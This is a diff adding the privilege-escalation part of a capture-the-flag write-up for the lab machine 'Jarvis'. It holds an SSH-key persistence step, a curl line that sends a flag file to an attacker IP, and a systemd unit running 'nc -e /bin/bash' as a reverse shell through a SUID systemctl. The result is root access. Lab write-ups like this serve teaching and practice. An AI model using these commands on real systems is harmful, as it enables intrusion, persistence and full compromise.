@@ -380,4 +380,104 @@ curl 10.10.14.2:8000/`cat /home/pepper/user.txt`
 
 So now, how do we get an easier to use command shell?
 
+Let's just add our SSH key to Pepper's authorised SSH keys!
 
+```
+pepper@jarvis:~$ mkdir .ssh && echo "MY SSH KEY" > .ssh/authorized_keys
+```
+
+Now we can log in as Pepper over SSH, which will let us actually see our command output. My next step was to upload a copy of LinEnum to start doing some post-compromise enumeration and figure out where to go next.
+
+What caught my eye is that this box uses Systemd and in the list of SUID files is systemctl
+
+```
+[-] SUID files:
+-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
+-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
+-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 /bin/systemctl
+-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
+-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 440728 Mar  1 11:19 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+Maybe we can do something with a systemd unit to escalate to root? In my research, I found Uptux, a python script for looking for local priv esc using systemd/D-Bus.
+
+<SEE uptux.out for full output>
+
+The section that caught my eye in the output was:
+```
+++++++++++  uptux_check_socket_units: Inspect systemd socket unit files  ++++++++++
+
+
+[*] Starting module at 2019-07-31-09.55.55
+
+
+[*] Found 16 socket units to analyse...
+
+
+[*] Checking permissions on socket unit files...
+
+[+] No writeable targets. This is expected...
+
+[*] Checking for write access to AF_UNIX sockets...
+
+[INVESTIGATE] You have write access to AF_UNIX socket files invoked by a systemd service.
+This could be interesting.
+You can attach to these files to look for an exploitable API.
+  /lib/systemd/system/systemd-journald.socket:
+    /run/systemd/journal/stdout
+    /run/systemd/journal/socket
+
+  /lib/systemd/system/dbus.socket:
+    /var/run/dbus/system_bus_socket
+
+  /lib/systemd/system/syslog.socket:
+    /run/systemd/journal/syslog
+
+  /lib/systemd/system/systemd-journald-dev-log.socket:
+    /run/systemd/journal/dev-log
+
+
+
+[*] Finished module at 2019-07-31-09.55.55
+```
+
+Apparently using systemctl you can use the link command to make a systemd unit available even if it isn't in the normal search paths (which pepper doesn't have write access to), so we need to setup some way of spawning a shell using systemd.
+
+```
+[Unit]
+Description=Reverse shell
+
+[Service]
+Type=oneshot
+ExecStart=/bin/nc -e /bin/bash 10.10.16.58 8888
+```
+
+```
+pepper@jarvis:~$ systemctl link shell.service
+Failed to link unit: Invalid argument
+pepper@jarvis:~$ systemctl link /home/pepper/shell.service
+Created symlink /etc/systemd/system/shell.service → /home/pepper/shell.service.
+```
+
+Now all we need to do is setup a listener and start the unit
+
+```
+# local
+nc -l 8888
+# Target
+systemctl start shell
+# Netcat listener
+whoami
+root
+cat /root/root.txt
+d41d8cd98f00b204e9800998ecf84271
+```
